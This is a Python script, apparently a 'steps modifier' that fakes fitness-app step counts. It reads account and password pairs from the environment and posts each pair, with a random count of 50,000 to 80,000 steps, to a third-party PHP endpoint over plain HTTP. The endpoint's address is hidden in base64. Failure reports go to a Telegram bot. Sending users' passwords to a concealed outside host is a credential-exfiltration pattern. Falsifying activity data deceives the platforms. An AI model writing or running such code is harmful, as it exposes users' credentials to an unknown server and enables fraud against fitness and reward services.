import os
import requests
import base64
import random

telegram_api_token = os.environ.get('TELEGRAM_API_TOKEN')
telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID')

# 检查 Telegram 相关信息是否存在
if telegram_api_token is None or telegram_chat_id is None:
    print("Telegram API Token或聊天ID未设置。无法发送通知。")
    # 在这里可能进行其他处理或记录日志，因为无法发送通知
else:
    accounts_and_passwords = os.environ['ACCOUNTS_AND_PASSWORDS']
    account_password_pairs = [pair.split(',') for pair in accounts_and_passwords.split(';')]

    def send_telegram_message(message):
        telegram_url = f"https://api.telegram.org/bot{telegram_api_token}/sendMessage"
        data = {
            'chat_id': telegram_chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(telegram_url, data=data)

    def modify_steps(account, password, min_steps=None, max_steps=None, attempts=3, timeout=20):
        consecutive_failures = 0
        for _ in range(attempts):
            try:
                encoded_url = 'aHR0cDovL2JzLnN2di5pbmsvaW5kZXgucGhw'
                url = base64.b64decode(encoded_url).decode('utf-8')
                steps = random.randint(min_steps, max_steps)
                data = {
                    'account': account,
                    'password': password,
                    'steps': steps
                }

                try:
                    response = requests.post(url, data=data, timeout=timeout)
                    result = response.json()

                    if result.get('message') == 'success':
                        return {
                            'account': account,
                            'response': result.get('message', 'No message found in response')
                        }
                    else:
                        consecutive_failures += 1
                except Exception as e:
                    consecutive_failures += 1

                if consecutive_failures == 3:
                    telegram_message = f"<b>Steps_modifier</b>\n\n账号： {account}\n连续三次失败"
                    send_telegram_message(telegram_message)
                    return {
                        'account': account,
                        'response': "Exceeded maximum consecutive failures"
                    }
            except Exception as e:
                telegram_message = f"<b>Steps_modifier</b>\n\n账号： {account}\n错误： {str(e)}"
                send_telegram_message(telegram_message)

        return {
            'account': account,
            'response': "Exceeded maximum attempts"
        }

    if __name__ == "__main__":
        min_steps = 50000
        max_steps = 80000

        for account, password in account_password_pairs:
            result = modify_steps(account, password, min_steps, max_steps)
            hidden_account = account[:3] + '*' * (len(account) - 6) + account[-3:]

            print("账号:", hidden_account)
            print("响应:", result['response'])
